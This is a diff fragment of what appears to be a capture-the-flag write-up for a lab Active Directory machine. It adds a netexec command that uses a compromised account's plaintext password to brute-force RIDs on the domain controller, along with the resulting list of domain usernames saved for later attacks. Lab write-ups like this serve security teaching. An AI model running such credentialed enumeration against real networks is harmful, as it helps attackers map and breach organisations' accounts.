@@ -359,3 +359,29 @@ SMB         10.129.245.51   445    DC01             [+] certificate.htb\Sara.B:B
 
 This user is now compromised!
 
+```python
+ ❯❯❯ nxc smb dc01.certificate.htb -u sara.b -p 'Blink182' --rid-brute 20000 | grep SidTypeUser | cut -d '\' -f 2 | cut -d ' ' -f 1 | tee users.txt
+Administrator
+Guest
+krbtgt
+DC01$
+WS-01$
+Kai.X
+Sara.B
+John.C
+Aya.W
+Nya.S
+Maya.K
+Lion.SK
+Eva.F
+Ryan.K
+akeder.kh
+kara.m
+Alex.D
+karol.s
+saad.m
+xamppuser
+WS-05$
+```
+
+Ill recollect user
